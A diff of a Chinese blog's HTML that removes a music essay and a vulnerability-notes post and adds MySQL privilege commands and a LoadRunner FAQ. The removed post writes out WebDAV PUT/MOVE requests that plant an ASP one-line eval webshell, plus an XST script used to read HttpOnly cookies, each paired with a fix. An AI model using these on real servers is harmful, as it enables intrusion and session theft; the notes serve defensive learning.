-<p>我们民族的音乐，有很多和中国传统音乐的相同之处。她不同于大和民族的音乐有着许多的“3-4”“7-1”这种半音式组合或者“小三和弦”，它更多的是类似于中国传统的五声音阶：宫、商、角、徵、羽（1、2、3、5、6）。如果你将典型的朝鲜族歌曲《阿里郎》、《桔梗谣》等还原成C大调，那么我们不但发现不了“半音组合”而且连“变徵”（7）这个音都找不到。一些受欧洲性元素影响的音乐，如典型的俄罗斯音乐常以小调的形式出现，乐曲常为“降E”调，日本性音乐也不乏小调作品且多出现“半音组合”和变徵之音。所以单纯就这点而言，朝鲜民族的音乐和中国传统音乐还是更为亲近的。从典型的朝鲜族乐器中也可找出例证，比如说与竹笛相似的细筚篥；与古筝很相似的伽倻琴（我知道这是你的最爱O(∩_∩)O~）。此外，在欧洲性的音乐中常见3/4拍，6/8拍那样的乐曲，让人有种想跳舞的冲动；美国的乡村民谣也成了4/4拍节奏应用的典型，但是到了朝韩半岛，不光会有《阿里郎》《桔梗谣》这种婉转又悠扬的3/4拍乐曲，还会有《红太阳照边疆》《农村四季歌》、《春耕谣》、《苹果丰收》这样欢快的乡村气息歌曲，但是别忘了，我们的民族始终流淌着通古斯的血液呢、所以我们也并不缺少在2/4拍这种进行曲节奏上的出色表现。就如你父亲最尊敬的那位艺术家，中国军歌之父、中国朝鲜族作曲家정률성（郑律成）所写的《八路军进行曲》《延安颂》《中国人民解放军进行曲》《朝鲜人民军进行曲》一样铿锵。</p>
-<p>亲爱的，你还记得那次我们一起听的爵士音乐会么？其实那天我一直在思考一个问题，而且越想越有趣。你看哈，1910年左右发源于美国佛罗里达州南部的爵士乐，在上个世纪六、七十年代传入日本和韩国，在那样一个部分亚洲国家疯狂亲美的年代，爵士乐毫无阻力地融入了日本的流行音乐中，不声不响如村上春树手中会拿着拉罐啤酒般自然；而到了韩国，爵士乐并非仅仅仍是老套的钢琴、贝斯和铜管乐器组合，而是融入了“长鼓”这一高丽特色。长鼓的声声敲击，似乎提醒着我们这些高丽儿女，即便是在享受舶来品爵士乐的同时，也别忘了身体里的民族血液，崇洋尚可，媚外不得！</p>
-<p>我至今还记得我们一起听音乐会的那个雨夜，演出结束后你问我“乔，这次你为何这么安静？”我当时微笑着没有说话。哦！亲爱的，你可知道当时我心中的波澜！当时牵着你手的我早已神游至天际，那长鼓震颤的音腔恰如我当年独自一人在朝韩半岛寻根时澎湃的胸膛，那音符似乎带我重回了昔日时光，我早已随他们眼含热泪地翻越了一道道民族与爱的山岗。</p>
-<h2 id="5-关于我的近况：">5.关于我的近况：</h2><p>亲爱的，你懂的，我还是那个不会开车，不会淘宝，连KTV都不去的无聊男人。至于说娱乐活动么，好多天前的一个晚上出门玩儿了一会儿，和“姜城子”看了一部叫《狼图腾》的电影。我一直在和“姜城子”探讨一个问题，虽然问题的答案目前还无法成为一个体系，但是已经稍微有了一丁点的眉目。</p>
-<p>你看啊，农耕民族种植庄稼，有时要靠“天”吃饭，所以华夏文名所崇拜的自然就是能掌控四季风调雨顺的“龙图腾”；草原民族不能让野鼠、野兔和过量的羊群破坏草场，所以需要狼来控制草原的生态平衡，而且死后还要用狼来实行“天葬”，于是自然有了“狼图腾”；但是像高丽人以及其他居住山林地带常与野兽相伴的通古斯后裔，自然就有了对“虎图腾“的敬畏。结果前些日子十分荣幸在延边州游走时，无意地走入珲春市的一个公园，穿过了林荫的山路小道，一路上思虑着这曲径幽处会带给我何样的惊喜，结果我忽见一块巨石，上面浮雕着四头面朝四方通天咆哮的巨虎！亲爱的，那一刻一种骨子里的民族亲近感随着血液的喷涌蔓延至我全身，我震颤着摘掉了头上的帽子，冒着大东北近零下20度的寒风，仰天长啸一声。那份油然而生的敬慕，恰如阮籍与孙登以长啸代绵谈的对话，似乎万千言语都不如这一份玄妙，碰撞着我身上的高丽血统，恰如遥远的绝响。第二日我又乘车奔赴延吉的帽儿山，方罢下车又在那山腰处看到一巨虎图腾。华夏民族向来讲究坐北朝南从而便于采光，但是通古斯的分支大多喜欢朝东拜日，而那巨虎恰是面朝东方，似乎在守望着代代高丽儿孙。亲爱的，你可知道，当时我是有多希望你在我身边分享这一份喜悦啊！</p>
-<p>转自<a href="http://cjker.com/a/2637" target="_blank" rel="external">稀客日韩</a>by 阿策</p>
-</span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/08/13/漏洞记录-1/" itemprop="url">
-                漏洞记录-1
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-08-13T15:08:32+08:00" content="2015-08-13">
-            2015-08-13
-          </time>
-        </span>
-
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/08/13/漏洞记录-1/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/13/漏洞记录-1/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><h2 id="Apache_HTTP_Server_“httpolny”cookie_泄露">Apache HTTP Server “httpolny”cookie 泄露</h2><p>1.为了防止XSS，我们通常采用给cookie附上httponly属性，来禁止js获取cookie.</p>
-<p>2.原理：当Apache接收到了cookie长度超过4k，返回400，并且将所有的cookie信息返回，提示cookie过长.</p>
-<p>3.利用：为用户的cookie添加一些无用信息，总长超过4k，使Apache返回400，并用过js正则过滤掉无用部分，我们就绕过了httponly的设置.</p>
-<p>4.修复：受影响的版本为2.21及其之前的所有版本，做好备份，升级Apache.</p>
-<h2 id="IIS_WebDav_Options_方法未禁用">IIS WebDav Options 方法未禁用</h2><p>1.WebDav是基于HTTP1.1的扩展协议，集成在window xp和IIS中，定义了除了Get，Post等一些http协议基本方法之外的一些方法例如：Option,put,move等.</p>
-<p>2.原理：使用option方法查看服务器允许哪些方法的提交，可能造成安全隐患.</p>
-<p>3.利用：<br>-使用option探测服务器信息：</p>
-<pre><code>OPTIONS/HTTP/<span class="number">1.1</span>
-Host:www<span class="class">.xxxx</span><span class="class">.com</span>
-</code></pre><p>  返回：</p>
-<pre><code>  HTTP/<span class="number">1.1</span> <span class="number">200</span> OK
-  Date:Fri,<span class="number">01</span> Jan <span class="number">2011</span> <span class="number">04</span>:<span class="number">23</span>:<span class="number">39</span> GMT
-  Server: Microsoft-IIS/<span class="number">6.0</span>
-  X-Powered-By:ASP.NET
-  MS-Author-Via:DAV
-  Content-Length:<span class="number">0</span>
-  Accept-Ranges:none
-  DASL:&lt;DAV:sql&gt;
-  DAV:<span class="number">1.2</span>
-Public:OPTION,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE...
-Cacha-Control:<span class="keyword">private</span>
-</code></pre><p>-上传文本文件：</p>
-<pre><code>PUT<span class="regexp">/test.txt HTTP/</span><span class="number">1.1</span>
-<span class="string">Host:</span>www.xxxx.com
-Content-<span class="string">Length:</span><span class="number">26</span>
-&lt;%eval(request(<span class="string">"cmd"</span>))%&gt;
-</code></pre><p>  返回：</p>
-<pre><code>HTTP/1.1 200 OK
-  Date:Fri,01 Jan 2011 04:23:39 GMT
-  Server: Microsoft-IIS/6.0
-  X-Powered-By:ASP.NET
-location：<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>
-Allow:OPTION,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE...
-//上传成功
-</code></pre><p>-通过MOVE改名(需要IIS勾选允许脚本资源访问复选框)：</p>
-<pre><code>MOVE/test<span class="class">.txt</span> HTTP/<span class="number">1.1</span>
-Host:wwww<span class="class">.xxxx</span><span class="class">.com</span>
-Destination:http:<span class="comment">//www.<span class="label">xxxx.com/webshell.asp</span></span>
-</code></pre><p>  返回：</p>
-<pre><code>HTTP/<span class="number">1.1</span> <span class="number">201</span> Created
-  Date:Fri,<span class="number">01</span> Jan <span class="number">2011</span> <span class="number">04</span>:<span class="number">23</span>:<span class="number">39</span> GMT
-  Server: Microsoft-IIS/<span class="number">6.0</span>
-  X-Powered-By:ASP.NET
-location：www.xxxx.com/webshell.asp
-Content-type:text/xml
-Content-length:<span class="number">0</span>
-<span class="comment">//修改成功</span>
-</code></pre><p>4修复：属于服务器配置不当造成的安全问题，options PUT DELETE MOVE方法如非必须请关闭.</p>
-<h2 id="TRACE_方法未禁用">TRACE 方法未禁用</h2><p>1.TRACE是HTTP协议提供的协议调试方法，发送什么请求，它会将请求原封返回.<br>可能存在的危害是能够与XSS配合获取用户httponly的cookie内容.</p>
-<p>2.原理：客户端JavaScript提出一个TRACE请求，并读取这个请求的响应，那么这段脚本就能够访问标记为HttpOnly的cookie，即使通过document.cookie属性也无法访问它们.</p>
-<p>3.利用：</p>
-<pre><code><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="actionscript">  
-&lt;!--  
-<span class="function"><span class="keyword">function</span> <span class="title">xssTRACE</span><span class="params">()</span></span>{  
-<span class="keyword">var</span> xmlHttp=<span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);  
-xmlHttp.open(<span class="string">"TRACE"</span>,<span class="string">"http://wmjie.51.net/swords/"</span>,<span class="literal">false</span>);  
-xmlHttp.send();  
-xmlDoc=xmlHttp.responseText;  
-alert(xmlDoc);  
-}  
-<span class="comment">//--&gt;  </span>
-</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
-<span class="tag">&lt;<span class="title">INPUT</span> <span class="attribute">TYPE</span>=<span class="value">BUTTON</span> <span class="attribute">onClick</span>=<span class="value">"xssTRACE();"</span> <span class="attribute">VALUE</span>=<span class="value">’XSS</span> <span class="attribute">TRACE</span>’&gt;</span>
-//将如上恶意代码插入页面，一个正常用户通过这个被劫持的页面进行访问，即使是设置属性httponly的cookie也通过TRACE方法的请求，显示在返回页面中.
-</code></pre><p>4.修复：属于服务器配置不当造成的安全问题，TRACE方法，如非必须请关闭.</p>
-<h2 id="IIS短文件名泄露">IIS短文件名泄露</h2><p>1.如果网站是运行在IIS服务器上，可以通过”~”来发现一些文件和文件夹,攻击者可以发现重要的文件或者文件夹，如果这些文件或者文件夹是正规的可见文件.攻击者可以通过该途径搜集文件名称(字符长度不超过6).<br>2.原理：使用通配符<code>*</code>和<code>?</code>发送一个请求到iis,当IIS接收到一个文件路径中包含”~”的请求时，它的反应是不同的.基于这个特点，我们可以根据http的响应区分一个可用或者不可用的文件.<br>3.修复：</p>
-<ul>
-<li><p>过滤<code>~</code>字符.</p>
-</li>
-<li><p>Windows中禁用8.3格式文件名方法如下(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)：</p>
-<p>  cmd&gt; fsutil 8dot3name query c:<br>“c:”表示查询C盘的状态.<br>如果功能被启用，会显示类似如下的信息：</p>
-<p>  Disable8dot3 的卷状态为 0 (8dot3 名称创建已启用).<br>  NtfsDisable8dot3NameCreation 的注册表状态为默认值 2 (卷级别设置).<br>  基于以上的两个设置，在 c: 上启用 8dot3 名称创建.</p>
-</li>
-</ul>
-<p>如果在C盘上关闭这个功能，则可使用以下命令：</p>
-<pre><code>cmd&gt; fsutil <span class="number">8</span>dot3name <span class="built_in">set</span> C: <span class="number">1</span>
-<span class="comment">//0（全部启动），1（全部禁用），2（每个盘符单独设置），3（除系统盘外全部禁用）.</span>
-</code></pre><p>也可以通过修改注册表实现：</p>
-<pre><code>键：HKLM<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\FileSystem</span>
-值：NTFSDisable8dot3NameCreation  类型：REG_DWORD
-</code></pre><ul>
-<li>使用waf进行防护.</li>
-</ul>
-<h2 id="会话标识别未更新">会话标识别未更新</h2><p>1.会话标识别未更新</p>
-<p>2.原理：用户的登录页面会有一个session id，登录成功后，应该使用新的session id 而不是保持登录页面的session id， 这样即使别人在网络上截获了你的登录页面的session id，仍然无法伪造客户身份进入系统.<br>如果使用同样的session id，则可能被截获并且伪造客户身份进入系统.</p>
-<p>3.修复：<br>-始终生成新的会话，供用户成功认证时登录.<br>-防止用户操纵会话标识.<br>-请勿接受用户浏览器登录时所提供的会话标识.</p>
-<h2 id="敏感信息泄露">敏感信息泄露</h2><p>1.以电话号码泄露为例</p>
-<p>2.原理：敏感信息(电话号码，内网IP)显示在了页面，源码，url地址中.</p>
-<p>3.利用：可作为进一步渗透的信息储备</p>
-<p>4.修复：此号码网站业务正常，无实际安全影响，站点可根据网站自身情况是否去除号码.</p>
-<h2 id="缺少httponly属性">缺少httponly属性</h2><p>1.会话cookie中缺少HttpOnly属性会导致攻击者可以通过程序(JS脚本、Applet等)获取到用户的cookie信息，造成用户cookie信息泄露，增加攻击者的跨站脚本攻击威胁.</p>
-<p>2.修复：<br>向所有会话cookie中添加“HttpOnly”属性.</p>
-<pre><code>Java示例：
-HttpServletResponse response2 = (HttpServletResponse)<span class="built_in">response</span>;
-response2.setHeader( <span class="string">"Set-Cookie"</span>, <span class="string">"name=value; HttpOnly"</span>); 
-
-C#示例：
-HttpCookie myCookie = <span class="keyword">new</span> HttpCookie(<span class="string">"myCookie"</span>); 
-myCookie.HttpOnly = <span class="literal">true</span>; 
-<span class="built_in">Response</span>.AppendCookie(myCookie);
-
-VB.NET示例：
-<span class="keyword">Dim</span> myCookie As HttpCookie = <span class="keyword">new</span> HttpCookie(<span class="string">"myCookie"</span>) 
-myCookie.HttpOnly = <span class="literal">True</span> 
-<span class="built_in">Response</span>.AppendCookie(myCookie) 
-</code></pre><h2 id="启用不安全的HTTP方法">启用不安全的HTTP方法</h2><p>1.检测到目标Web服务器配置成允许下列其中一个（或多个）HTTP 方法：DELETE, SEARCH,COPY,MOVE, PROPFIND, PROPPATCH, MKCOL ,LOCK ,UNLOCK.这些方法表示可能在服务器上使用了 WebDAV.由于dav方法允许客户端操纵服务器上的文件，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件.<br>2.利用：<br>参考：</p>
-<blockquote>
-<p>IIS WebDav Options 方法未禁用</p>
-</blockquote>
-<p>3.修复：<br>如果服务器不需要支持WebDAV，请禁用.<br>或者为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码.</p>
-<h2 id="目标web应用表单密码类型输入启用了自动完成操作">目标web应用表单密码类型输入启用了自动完成操作</h2><p>1.在web应用form表单中，如果input标签没有指定“autocomplete”属性为“off”，则“autocomplete”的属性会自动默认为“on”.<br>当web应用form表单中的密码类型的input标签的“autocomplete”属性为“on”时，用户若提交了一个新的用户名和密码时，浏览器将会询问用户是否保存该用户名和密码信息.<br>如果用户选择保存，则之后在显示该web应用表单时，用户名和密码将会被自动填充到对应的输入框中.<br>用户一但保存密码，攻击者就可以通过本地从浏览器缓存中获取明文密码，导致用户敏感信息泄露.</p>
-<p>2.修复：<br>修改web应用form表单中密码类型input标签的“autocomplete”属性为“off”.</p>
-<p>示例：</p>
-<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;
-则增加“autocomplete”属性为“off”即可，修改为：
-&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"password"</span> name=<span class="string">"password"</span> autocomplete=<span class="string">"off"</span>&gt;
-</code></pre></span>
         
       
     </div>
@@ -1421,6 +1059,477 @@ mysql&gt; alter table admin renanme admin5<span class="comment">;//重命名表<
 
 
     
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              <a class="post-title-link" href="/2015/08/11/SQL注入练级攻略-2-权限分配/" itemprop="url">
+                SQL注入练级攻略(2)-权限分配
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-08-11T11:14:10+08:00" content="2015-08-11">
+            2015-08-11
+          </time>
+        </span>
+
+        
+          <span class="post-category" >
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/SLQ注入练级系列/" itemprop="url" rel="index">
+                  <span itemprop="name">SLQ注入练级系列</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/08/11/SQL注入练级攻略-2-权限分配/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/11/SQL注入练级攻略-2-权限分配/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><h2 id="查看：">查看：</h2><pre><code>mysql&gt;show grants <span class="keyword">for</span> <span class="built_in">test</span> //查看用户<span class="built_in">test</span>所有权限
+</code></pre><h2 id="增加：">增加：</h2><pre><code>mysql&gt; grant <span class="keyword">select</span>,update <span class="keyword">on</span> myslq<span class="built_in">.</span>* <span class="keyword">to</span> test identified <span class="keyword">by</span> <span class="string">"qwe123"</span> ;
+<span class="comment">//将myslq库select update 权限分配给test并将密码改为"qwe1232"</span>
+mysql&gt; grant <span class="literal">all</span> privileges <span class="keyword">on</span> mysql<span class="built_in">.</span>* <span class="keyword">to</span> test <span class="keyword">with</span> grant option;<span class="comment">//mysql库的所有权限</span>
+重复添加不报错
+mysql&gt; grant <span class="literal">all</span> privileges <span class="keyword">on</span> *<span class="built_in">.</span>* <span class="keyword">to</span> test <span class="keyword">with</span> grant option;
+</code></pre><h2 id="删除：">删除：</h2><pre><code>mysql&gt; revoke select <span class="function_start"><span class="keyword">on</span></span> myslq.* <span class="keyword">from</span> test;
+mysql&gt; revoke all privileges <span class="function_start"><span class="keyword">on</span></span> mysql.* <span class="keyword">from</span> test;
+</code></pre><h2 id="立即更新:">立即更新:</h2><pre><code>mysql&gt; flush privileges<span class="comment">;</span>
+</code></pre><p><a href="http://drops.wooyun.org/tips/2245" target="_blank" rel="external">权限分配细则–乌云知识库</a></p>
+<p><em>以上内容使用的数据库版本为mysql 5.6.17.</em></p>
+</span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              <a class="post-title-link" href="/2015/08/11/SQL注入练级攻略-1-用户增删改查/" itemprop="url">
+                SQL注入练级攻略(1)-用户增删改查
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-08-11T09:02:25+08:00" content="2015-08-11">
+            2015-08-11
+          </time>
+        </span>
+
+        
+          <span class="post-category" >
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/SLQ注入练级系列/" itemprop="url" rel="index">
+                  <span itemprop="name">SLQ注入练级系列</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/08/11/SQL注入练级攻略-1-用户增删改查/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/11/SQL注入练级攻略-1-用户增删改查/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><p>把自己的sql语句的练级过程记录下来，以mysql数据库为例。<br>（命令不区分大小写）</p>
+<h2 id="登录MYSQL:">登录MYSQL:</h2><pre><code><span class="built_ins">cmd</span>&gt;mysql -u root -p
+<span class="built_ins">cmd</span>&gt;密码
+</code></pre><h2 id="查看：">查看：</h2><p>MYSQL将用户信息存储在mysql.user中<br>可以使用select命令<strong>查看</strong>user表中的数据（当前用户必须有对user的查看权限）</p>
+<pre><code>mysql&gt;<span class="keyword">select</span> user,host,password <span class="keyword">from</span> mysql.user;<span class="comment">//或者使用以下两个分步语句</span>
+mysql&gt;show databases;                      <span class="comment">//显示当前用户可查看的所有数据库</span>
+mysql&gt;use mysql;                           <span class="comment">//选择mysql数据库</span>
+mysql&gt;<span class="keyword">select</span> user,host,password <span class="keyword">from</span> user; <span class="comment">//从user表中查询</span>
+mysql&gt;<span class="function"><span class="keyword">select</span> <span class="title">user</span>(<span class="params"></span>)</span>;                        <span class="comment">//查看当前用户</span>
+</code></pre><h2 id="创建：">创建：</h2><pre><code>mysql&gt;<span class="built_in">create</span> user test identified <span class="keyword">by</span> <span class="string">"123"</span><span class="comment"> //纯文本123加密存储在user表中password字段</span>
+</code></pre><h2 id="修改：">修改：</h2><pre><code>mysql&gt;rename user <span class="built_in">test</span> to <span class="built_in">test</span>1;
+
+mysql&gt;<span class="built_in">set</span> password <span class="keyword">for</span> <span class="built_in">test</span> = password(<span class="string">'123'</span>)//对user表没有操作权限的用户可以用此命令修改自己的密码
+mysql&gt;update mysql.user <span class="built_in">set</span> password = password(<span class="string">'123'</span>) <span class="built_in">where</span> user = <span class="string">"test"</span> //修改任意用户密码
+</code></pre><h2 id="删除:">删除:</h2><pre><code>mysql&gt;drop <span class="keyword">user</span> test;  //删除名为test的<span class="keyword">user</span>
+
+mysql&gt;delete <span class="keyword">from</span> mysql.<span class="keyword">user</span> where <span class="keyword">user</span> = <span class="string">"test"</span> //不知道和上面的有什么区别
+</code></pre><p><em>以上内容使用的数据库版本为mysql 5.6.17.</em></p>
+</span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              <a class="post-title-link" href="/2015/08/10/loadrunner问题记录/" itemprop="url">
+                loadrunner问题记录
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-08-10T13:54:01+08:00" content="2015-08-10">
+            2015-08-10
+          </time>
+        </span>
+
+        
+          <span class="post-category" >
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/性能测试/" itemprop="url" rel="index">
+                  <span itemprop="name">性能测试</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/08/10/loadrunner问题记录/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/10/loadrunner问题记录/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><h2 id="简介">简介</h2><pre><code><span class="variable">HTML</span>-<span class="variable">Based</span>是在web测试脚本录制过程中默认选项.它基于界面，将属于一个界面的所有请求放在一个一个<span class="variable">Web</span>-url中.
+<span class="variable">URL</span>-<span class="variable">Based</span>在web测试脚本的录制过程，将每一个http请求放在一个<span class="variable">Web</span>-url中可读性较差.
+</code></pre><h2 id="HTML-Base&amp;URL-Based二者对比">HTML-Base&amp;URL-Based二者对比</h2><table>
+<thead>
+<tr>
+<th style="text-align:center">编号</th>
+<th><code>HTML_Based</code></th>
+<th><code>URL_Based</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">阅读性</td>
+<td>HTML为用户的每一个动作产生单独的步骤，脚本录制结果简洁直接，可阅读性强</td>
+<td>将每一个url请求放入web-url中，能更好的控制业务过程</td>
+</tr>
+<tr>
+<td style="text-align:center">选择</td>
+<td>基于浏览器的应用选择此项</td>
+<td>不是基于浏览器的应用/基于浏览器的应用中的脚本语言/javascript Applets向服务器发出了请求/使用了https协议</td>
+</tr>
+</tbody>
+</table>
+<p>注：录制过程不要使用浏览器的后退功能loadrunner对其支持不是很好.</p>
+<h2 id="LoadRunner录制脚本时为什么不弹出IE浏览器?">LoadRunner录制脚本时为什么不弹出IE浏览器?</h2><p>A.当一台主机上安装多个浏览器时，LoadRunner录制脚本经常遇到不能打开浏览器的情况，可以用下面的方法来解决.<br>启动浏览器，打开Internet选项对话框，切换到高级标签，去掉“启用第三方浏览器扩展(需要重启动)”的勾选，然后再次运行VuGen即可解决问题<br>提示：通常安装Firefox等浏览器后，都会勾选上面得选项，导致不能正常录制.因此建议运行LoadRunner得主机上保持一个干净的测试环境.<br>B.点Vuser》Run-Time Setting》Brower》Brower Version》Change==修改IE版本和WIN 7</p>
+<h2 id="录制Web脚本时，生成的脚本中存在乱码该如何解决?">录制Web脚本时，生成的脚本中存在乱码该如何解决?</h2><p>　　录制脚本前，打开录制选项配置对话框Record-Options，进入到Advanced标签，先勾选“Support charset”，然后选择中支持UTF-8.在IIS中找到Web.Config文件，在<system.web>….</system.web>节加入<globalization requestencoding="gb2312" responseencoding="gb2312" fileencoding="gb2312">后再次录制，就不会出现中文乱码问题了.</globalization></p>
+<h2 id="HTML-based_script与URL-based_script的脚本有什么区别?">HTML-based script与URL-based script的脚本有什么区别?</h2><p>使用“HTML-based script”的模式录制脚本，VuGen为用户的每个HTML操作生成单独的步骤，这种脚本看上去比较直观;使用“URL-based script”模式录制脚本时，VuGen可以捕获所有作为用户操作结果而发送到服务器的HTTP请求，然后为用户的每个请求分别生成对应方法.<br>通常，基于浏览器的Web应用会使用“HTML-based script”模式来录制脚本;而没有基于浏览器的Web应用Web应用中包含了与服务器进行交互的Java Applet基于浏览器的应用中包含了向服务器进行通信的JavaScript/VBScript代码基于浏览器的应用中使用了HTTPS安全协议，这时使用“URL-based script”模式进行录制.</p>
+<h2 id="为什么脚本中添加了检查方法Web-find，但是脚本回放时却没有执行?">为什么脚本中添加了检查方法Web-find，但是脚本回放时却没有执行?</h2><p>由于检查点功能会耗费一定的资源，因此LoadRunner默认关闭了对文本及图像的检查.要想开启检查功能，必须修改运行时的配置Run-time Setting.<br>进入“Run-time Setting”对话框，依次进入“Internet Protocol→Preferences”，勾选Checks下的“Enable Image and text check”选项即可.<br>检查执行结果时推荐使用web_reg_find方法.</p>
+<h2 id="运行时的Pacing设置主要影响什么?">运行时的Pacing设置主要影响什么?</h2><p>Pacing主要用来设置重复迭代脚本的间隔时间.共有三种方法：上次迭代结束后立刻开始上次迭代结束后等待固定时间按固定或随机的时间间隔开始执行新的迭代.<br>根据实际需要设置迭代即可.通常，没有时间间隔会产生更大的压力.</p>
+<h2 id="运行时设置Log标签中，如果没有勾选“Enable_logging”，则手工消息可以发送吗?">运行时设置Log标签中，如果没有勾选“Enable logging”，则手工消息可以发送吗?</h2><p>Enable logging选项仅影响自动日志记录和通过lr_log_message发送的消息.即使没有勾选，虚拟用户脚本中如果使用lr_messagelr_output_messagelr_error_message,仍然会记录其发出的消息.</p>
+<h2 id="LoadRunner_8-0版本的VuGen在录制Web_Services协议的脚本时一切正常，而回放时报出错误提示“Error：server_returned_an_incorrectly_formatted_SOAP_response”-这时说明原因引起的?">LoadRunner 8.0版本的VuGen在录制Web Services协议的脚本时一切正常，而回放时报出错误提示“Error：server returned an incorrectly formatted SOAP response”.这时说明原因引起的?</h2><p>造成这种情况的主要原因是LoadRunner 8.0的VuGen在录制Web Service协议的脚本时存在一个缺陷：如果服务器的操作系统是中文的，VuGen会自动将WSDL文件的头改为，因此会有上面的错误提示.<br>解决方法：把“LR80WebservicesFPI_setup.exe”和“lrunner_web_sevices_path_1.exe”两个补丁打上即可解决.</p>
+<h2 id="VuGen支持Netscape的客户证书吗?">VuGen支持Netscape的客户证书吗?</h2><p>不支持.目前的VuGen 8.0版本中仅支持Internet Explorer的客户端证书.录制脚本时可以先从Netscape中导出所需的证书，然后将其导入到Internet Explorer中，并确保以相同的顺序导出和导入这些证书.而且，在每台将要录制或运行需要证书的Web Vuser脚本的计算机上都要重复执行前面的过程.</p>
+<h2 id="VuGen会修改录制浏览器中的代理服务器设置吗?">VuGen会修改录制浏览器中的代理服务器设置吗?</h2><p>会修改.在开始录制基于浏览器的Web Vuser脚本时，VuGen首先会启动指定的浏览器.然后，VuGen会指示浏览器访问VuGen代理服务器.为此，VuGen会修改录制浏览器上的代理服务器设置.默认情况下，VuGen会立即将代理服务器设置更改为Localhost:7777.录制之后，VuGen会将原始代理服务器设置还原到该录制浏览器中.因此，在VuGen进行录制的过程中，不可以更改代理服务器设置，否则将无法正常进行.</p>
